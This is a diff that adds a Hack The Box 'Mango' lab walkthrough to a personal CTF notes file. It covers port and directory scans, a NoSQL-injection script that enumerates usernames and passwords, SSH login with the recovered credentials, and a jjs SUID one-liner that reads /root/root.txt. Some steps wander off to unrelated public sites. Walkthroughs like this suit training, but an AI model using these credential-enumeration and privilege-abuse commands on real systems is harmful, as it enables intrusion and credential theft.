@@ -8,8 +8,9 @@ User owns means that I obtained a user flag... essentially, I managed to get acc
 System own means that I obtained a root flag... where I have admin privileges on the machine. This is the end goal for all hackthebox machines and allows complete control of the system.
 
 
-* [craft](#craft-writeup)
-* [heist](#heist-writeup)
+* [Craft](#craft-writeup)
+* [Heist](#heist-writeup)
+* [Mango](#mango-writeup)
 
 ## Craft Writeup:
 
@@ -187,3 +188,67 @@ Password = 4dD!5}x/re8]FBuZ
 > evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
 
 ### ROOT FLAG!!
+
+## Mango Writeup:
+
+`PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
+
+Go to http://10.10.10.162:443/
+
+Bad request... You're speaking plain HTTP to an SSL-enabled server port. Instead use the HTTPS scheme to access this URL, please.
+
+Type https://10.10.10.162/ instead
+
+Search engine ting
+
+Signed in as MrR3boot
+
+Connect > elasticsearch > go to url
+
+gobuster on url: https://olap.flexmonster.com/aspnet_client (Status: 301) https://olap.flexmonster.com/crossdomain.xml (Status: 200)
+
+IIS ver 8.5... There is sign in page: https://login.iis.net/account/login?ReturnUrl=https://www.iis.net/
+
+Go to crossdomain.xml... allows http request headers from anyone.
+
+Certificate --> staging-order.mango.htb
+
+hosts file --> 10.10.10.162 staging-order.mango.htb
+
+get login page!
+
+gobuster:
+
+`http://staging-order.mango.htb/.htaccess (Status: 403) http://staging-order.mango.htb/.hta (Status: 403) http://staging-order.mango.htb/.htpasswd (Status: 403) http://staging-order.mango.htb/index.php (Status: 200) http://staging-order.mango.htb/server-status (Status: 403) http://staging-order.mango.htb/vendor (Status: 301)`
+
+Search for mango DB injection
+
+mongo db Mongo is a NoSQL database
+
+NOSQL injection
+
+https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
+
+`python3 enum.py -u http://staging-order.mango.htb -m POST -up username -pp password -op login:login -ep username`
+
+Download zip from github and run in its folder for it to work!
+
+Found users 'admin' and 'mango'
+
+Run command again with -ep as 'password'
+
+Found passwords 'h3mXK8RhU~f{]f5H' and 't9KcS3>!0B#2', pass for mango and admin
+
+Logging in with admin and t9KcS3>!0B#2 gives us under construction page... DEAD END
+
+SSH into machine with mango and pass h3mXK8RhU~f{]f5H Run linEnum... SUID and GUID file at /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+su to admin with other password GET USER FLAG!
+
+Check out jjs... GTFO BINS--> It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+
+Run jjs at exact file path...
+
+Run this in terminal: `echo 'var BufferedReader = Java.type("java.io.BufferedReader"); var FileReader = Java.type("java.io.FileReader"); var br = new BufferedReader(new FileReader("/root/root.txt")); while ((line = br.readLine()) != null) { print(line); }' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs`
+
+### Get root flag!!!
